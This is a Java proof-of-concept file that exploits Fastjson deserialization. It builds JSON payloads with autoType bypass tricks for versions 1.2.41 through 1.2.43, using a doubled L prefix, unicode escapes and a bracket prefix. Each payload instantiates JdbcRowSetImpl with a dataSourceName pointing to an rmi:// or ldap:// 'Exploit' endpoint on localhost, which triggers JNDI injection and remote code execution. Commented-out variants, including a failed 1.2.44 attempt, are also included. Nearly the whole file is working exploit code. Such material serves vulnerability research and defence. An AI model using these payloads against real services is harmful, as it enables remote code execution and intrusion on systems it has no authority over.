package person;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

/**
 * Created by liaoxinxi on 2018-4-24.
 */
public class OtherPoC {
    public static void main(String[] argv){
        //testUnicode();
        testJdbcRowSetImpl();
    }
    public static void testJdbcRowSetImpl() {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        //1.2.41 bypass
        String payload = "{\"@type\":\"Lcom.sun.rowset.RowSetImpl;\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\"," +
                " \"autoCommit\":true}";
        //1.2.43
        String payload3 = "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{\"dataSourceName\":\"rmi://127.0.0.1:1099/Exploit\",\"autoCommit\":true]} ";//1.2.43
        //1.2.42
        String payload2 = "{\"@type\":\"LL\u0063\u006f\u006d.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\"," +
                " \"autoCommit\":true}";
        //1.2.44 尝试 failed
    /*    String payload = "{\"@type\":\"c\u0063\u006f\u006d.sun.rowset/JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\"," +
                " \"autoCommit\":true}";
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:389/Exploit\"," +
                " \"autoCommit\":true}";
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\"," +
                " \"autoCommit\":true}";*/

        JSON.parse(payload);
        JSON.parse(payload2);
        JSON.parse(payload3);
    }
}
